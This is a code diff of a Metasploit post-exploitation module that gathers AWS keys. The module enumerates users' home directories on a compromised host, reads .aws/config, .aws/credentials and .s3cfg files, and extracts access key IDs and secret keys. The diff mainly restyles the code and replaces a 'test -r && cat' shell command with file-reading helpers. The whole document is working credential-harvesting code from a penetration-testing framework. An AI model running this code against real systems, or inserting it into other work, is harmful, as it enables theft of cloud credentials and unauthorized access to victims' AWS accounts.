@@ -16,16 +16,16 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name'          => 'UNIX Gather AWS Keys',
-        'Description'   => %q(
+        'Name' => 'UNIX Gather AWS Keys',
+        'Description' => %q{
           This module will attempt to read AWS configuration files
           (.aws/config, .aws//credentials and .s3cfg) for users discovered
           on the session'd system and extract AWS keys from within.
-        ),
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'Jon Hart <jon_hart[at]rapid7.com>' ],
-        'SessionTypes'  => %w(shell meterpreter),
-        'References'    => [
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Jon Hart <jon_hart[at]rapid7.com>' ],
+        'SessionTypes' => %w[shell meterpreter],
+        'References' => [
           [ 'URL', 'http://s3tools.org/kb/item14.htm' ],
           [ 'URL', 'http://docs.aws.amazon.com/cli/latest/userguide/cli-chap-getting-started.html#cli-config-files' ]
         ]
@@ -35,8 +35,13 @@ class MetasploitModule < Msf::Post
 
   def get_aws_keys(config_file)
     keys_data = []
-    config_s = cmd_exec("test -r #{config_file} && cat #{config_file}")
+    unless readable? config_file
+      vprint_error("Couldn't read #{config_file}")
+      return []
+    end
+    config_s = read_file(config_file)
     return keys_data if config_s.empty?
+
     aws_config = Rex::Parser::Ini.from_s(config_s)
     aws_config.each_key do |profile|
       # XXX: Ini assumes anything on either side of the = is the key and value
@@ -54,6 +59,7 @@ class MetasploitModule < Msf::Post
         end
       end
       next unless aws_access_key_id || aws_secret_access_key
+
       keys_data << [ config_file, aws_access_key_id, aws_secret_access_key, profile ]
     end
 
@@ -62,14 +68,15 @@ class MetasploitModule < Msf::Post
 
   def get_keys_from_files
     keys_data = []
-    vprint_status("Enumerating possible user AWS config files")
+    vprint_status('Enumerating possible user AWS config files')
     # build up a list of aws configuration files to read, including the
     # configuration files that may exist (rare)
     enum_user_directories.map do |user_dir|
       vprint_status("Looking for AWS config/credentials files in #{user_dir}")
-      %w(.aws/config .aws/credentials .s3cfg).each do |possible_key_file|
+      %w[.aws/config .aws/credentials .s3cfg].each do |possible_key_file|
         this_key_data = get_aws_keys(::File.join(user_dir, possible_key_file))
         next if this_key_data.empty?
+
         keys_data <<= this_key_data.flatten
       end
     end
@@ -81,7 +88,7 @@ class MetasploitModule < Msf::Post
     return if keys_data.empty?
 
     keys_table = Rex::Text::Table.new(
-      'Header' => "AWS Key Data",
+      'Header' => 'AWS Key Data',
       'Columns' => [ 'Source', AWS_KEY, AWS_SECRET, 'Profile' ]
     )
 
